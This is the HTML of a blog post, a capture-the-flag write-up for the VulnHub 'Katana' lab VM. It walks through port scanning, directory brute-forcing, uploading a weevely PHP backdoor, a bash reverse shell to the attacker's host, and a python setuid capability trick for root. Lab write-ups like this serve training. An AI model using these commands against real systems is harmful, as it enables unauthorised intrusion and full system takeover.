@@ -1,0 +1,768 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="rightevil">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="🖳 host discover12345678910sudo netdiscover -r 192.168.213.0&#x2F;24Currently scanning: 192.168.213.0&#x2F;24   |   Screen View: Unique Hosts">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-wp katana">
+<meta property="og:url" content="https://rightevil.github.io/vulnhub-wp-katana/index.html">
+<meta property="og:site_name" content="rightevil">
+<meta property="og:description" content="🖳 host discover12345678910sudo netdiscover -r 192.168.213.0&#x2F;24Currently scanning: 192.168.213.0&#x2F;24   |   Screen View: Unique Hosts">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9fee67f690cc494cf5198.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9cfa819edad301b9fb320.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b0a9e1ebdd1f722de8b3a.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/859db8f34196741dfea2d.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d0f3004b7f1cb5936ad3d.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5551bff43abf3c0b9fd33.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a4331a194c20d80939e1c.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/32c460295232f487fec5f.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7942c6cdc6adac4d12bc3.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d1a64976d90b93131c3f1.png">
+<meta property="og:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/82e02b691dc2269b66312.png">
+<meta property="article:published_time" content="2024-03-31T03:26:06.000Z">
+<meta property="article:modified_time" content="2024-03-31T03:28:40.080Z">
+<meta property="article:author" content="rightevil">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9fee67f690cc494cf5198.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>vulnhub-wp katana - rightevil</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rightevil.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"UA-285611083-1","gtag":"G-TKYW22HREX","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-285611083-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.googletagmanager.com/gtag/js?id=G-TKYW22HREX', function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-TKYW22HREX');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+    <div id="fb-root"></div>
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/zh_TW/sdk.js#xfbml=1&version=v12.0"></script>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>舔狗日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/%E6%99%AE%E9%AB%98200%E5%A4%A9/">
+                <i class="iconfont icon-addrcard"></i>
+                普高200天
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                好友blog
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnhub-wp katana"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-31 11:26" pubdate>
+          2024年3月31日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulnhub-wp katana</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="🖳-host-discover"><a href="#🖳-host-discover" class="headerlink" title="🖳 host discover"></a>🖳 host discover</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.213.0/24<br>Currently scanning: 192.168.213.0/24   |   Screen View: Unique Hosts                                                                                                <br> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                             <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.213.1   00:50:56:c0:00:08      1      60  VMware, Inc.                   <br> 192.168.213.2   00:50:56:ed:a6:8f      1      60  VMware, Inc.                   <br> 192.168.213.129 00:0c:29:3f:3b:78      1      60  VMware, Inc.                   <br> 192.168.213.254 00:50:56:e3:da:55      1      60  VMware, Inc.             <br></code></pre></td></tr></table></figure>
+<p>target was <code>192.168.213.129</code></p>
+<h1 id="👁-service-scan"><a href="#👁-service-scan" class="headerlink" title="👁 service scan"></a>👁 service scan</h1><p>nmap scan</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -sV -sC -Pn -oN nmap --min-rate 8000 192.168.213.129<br>···<br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         vsftpd 3.0.3<br>22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:<span class="hljs-built_in">fc</span>:60:a6:de:35 (RSA)<br>|   256 <span class="hljs-built_in">dd</span>:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)<br>|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.38 ((Debian))<br>|_http-title: Katana X<br>|_http-server-header: Apache/2.4.38 (Debian)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)<br>7080/tcp open  ssl/http    LiteSpeed httpd<br>| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US<br>| Not valid before: 2020-05-11T13:57:36<br>|_Not valid after:  2022-05-11T13:57:36<br>|_http-title: Katana X<br>| tls-alpn: <br>|   h2<br>|   spdy/3<br>|   spdy/2<br>|_  http/1.1<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>|_http-server-header: LiteSpeed<br>8088/tcp open  http        LiteSpeed httpd<br>|_http-server-header: LiteSpeed<br>|_http-title: Katana X<br>8715/tcp open  http        nginx 1.14.2<br>|_http-title: 401 Authorization Required<br>|_http-server-header: nginx/1.14.2<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=Restricted Content<br>MAC Address: 00:0C:29:3F:3B:78 (VMware)<br>Service Info: Host: KATANA; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2024-03-31T02:02:39<br>|_  start_date: N/A<br>|_nbstat: NetBIOS name: KATANA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.9.5-Debian)<br>|   Computer name: katana<br>|   NetBIOS computer name: KATANA\x00<br>|   Domain name: \x00<br>|   FQDN: katana<br>|_  System time: 2024-03-30T22:02:39-04:00<br>···<br></code></pre></td></tr></table></figure>
+<p>there was lots of service, let’s try one by one!</p>
+<h1 id="🚪🚶-get-shell"><a href="#🚪🚶-get-shell" class="headerlink" title="🚪🚶 get shell"></a>🚪🚶 get shell</h1><p><em>21</em><br>there was not allow anonymous to login, so try other service<br><em>22</em> we dont have cred<br><em>80</em><br>brute path</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o 80.out -t 50<br>/.htm                 (Status: 403) [Size: 279]<br>/.php                 (Status: 403) [Size: 279]<br>/.                    (Status: 200) [Size: 655]<br>/.htaccess            (Status: 403) [Size: 279]<br>/.phtml               (Status: 403) [Size: 279]<br>/ebook                (Status: 301) [Size: 316] [--&gt; http://192.168.213.129/ebook/]<br>/.htc                 (Status: 403) [Size: 279]<br>/.html_var_DE         (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br>/.htpasswd            (Status: 403) [Size: 279]<br></code></pre></td></tr></table></figure>
+<p>nice, there was a ebook path!<br>it was a book store cms, there was two path to get shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9fee67f690cc494cf5198.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>login admin and add book, and upload a shell</li>
+<li>use exploit<br>it all fail. fot first, it seems cant write file into the img path.<br>second,it fail too.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 47887.py http://192.168.213.129/ebook<br>/home/rightevil/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn<span class="hljs-string">&#x27;t match a supported version!</span><br><span class="hljs-string">  warnings.warn(&quot;urllib3 (&#123;&#125;) or chardet (&#123;&#125;)/charset_normalizer (&#123;&#125;) doesn&#x27;</span>t match a supported <span class="hljs-string">&quot;</span><br><span class="hljs-string">&gt; Attempting to upload PHP web shell...</span><br><span class="hljs-string">&gt; Verifying shell upload...</span><br><span class="hljs-string">&gt; Web shell failed to upload! The web server may not have write permissions.</span><br></code></pre></td></tr></table></figure>
+try another port</li>
+</ul>
+<p><em>smb</em></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.213.129      <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\rightevil]:<br><br>	Sharename       Type      Comment<br>	---------       ----      -------<br>	<span class="hljs-built_in">print</span>$          Disk      Printer Drivers<br>	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)<br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br><br>	Server               Comment<br>	---------            -------<br>	Workgroup            Master<br>	---------            -------<br>	WORKGROUP            KATANA<br></code></pre></td></tr></table></figure>
+<p>nothings, and we could use enum4linux to enum user.(user:kanata)<br><em>7080</em><br>it’s a rabbit hole<br>nothing<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9cfa819edad301b9fb320.png" srcset="/img/loading.gif" lazyload><br>all the page was 403<br><em>8088</em><br>dir brute</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129:8088/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 50    <br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.213.129:8088/<br>[+] Method:                  GET<br>[+] Threads:                 50<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/cgi-bin              (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/cgi-bin/]<br>/css                  (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/css/]<br>/img                  (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/img/]<br>/docs                 (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/docs/]<br>/.                    (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/./]<br>/.htaccess            (Status: 403) [Size: 1227]<br>/protected            (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/protected/]<br>/blocked              (Status: 301) [Size: 1260] [--&gt; http://192.168.213.129:8088/blocked/]<br>Progress: 43007 / 43008 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>yes, the docs was the manual guide page about <code>OpenLiteSpeed Web Server 1.5</code>, but i dont find the exploit about it.<br>let’s search page</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.213.129:8088/  -x txt,php,html --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -t 50<br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b0a9e1ebdd1f722de8b3a.png" srcset="/img/loading.gif" lazyload><br>there was a upload.html<br>after trying, we could upload php file in it, but we it seems dont show in port 8088<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/859db8f34196741dfea2d.png" srcset="/img/loading.gif" lazyload><br>but it was a web page too(cause /html), so let’s try other port<br><em>8715</em><br>it have a get login, and we could login by <code>admin:admin</code><br>and our backdoor was in this port!<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d0f3004b7f1cb5936ad3d.png" srcset="/img/loading.gif" lazyload><br>let’s connect to it by weevely(i generate the backdoor by weevely).<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5551bff43abf3c0b9fd33.png" srcset="/img/loading.gif" lazyload><br>if u want,u could reverse a stable shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.213.128/443 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure>
+<h1 id="🛡️-PE"><a href="#🛡️-PE" class="headerlink" title="🛡️ PE"></a>🛡️ PE</h1><p>in /home/kanata, we find kanata’s passwd, and there was root’s hash in /etc/passwd.<br>but kanata dont have sudo or other, and we couldn’t crack the root’s hash<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a4331a194c20d80939e1c.png" srcset="/img/loading.gif" lazyload><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/32c460295232f487fec5f.png" srcset="/img/loading.gif" lazyload><br>finally, we find a cap file by linpeas.sh<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7942c6cdc6adac4d12bc3.png" srcset="/img/loading.gif" lazyload><br>so get root shell<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d1a64976d90b93131c3f1.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/python2.7 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;);&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/82e02b691dc2269b66312.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="📖-recommend-article"><a href="#📖-recommend-article" class="headerlink" title="📖 recommend article"></a>📖 recommend article</h1><p><a target="_blank" rel="noopener" href="https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/privilege-escalation#privilege-escalation-using-file-capabilities">PE about file capabilities</a><br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">PE about file capabilities in hacktricks</a><br><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/katana-1,482/">katana vulnhub download</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/vulnhub/">#vulnhub</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnhub-wp katana</div>
+      <div>https://rightevil.github.io/vulnhub-wp-katana/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>rightevil</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/vulnhub-wp-fristileaks-1-3/" title="vulnhub-wp fristileaks:1.3">
+                        <span class="hidden-mobile">vulnhub-wp fristileaks:1.3</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="lv-container" data-id="city" data-uid="MTAyMC81NzQyNC8zMzg4OA==">
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#lv-container', function() {
+        Fluid.utils.createScript('https://cdn-city.livere.com/js/embed.dist.js');
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
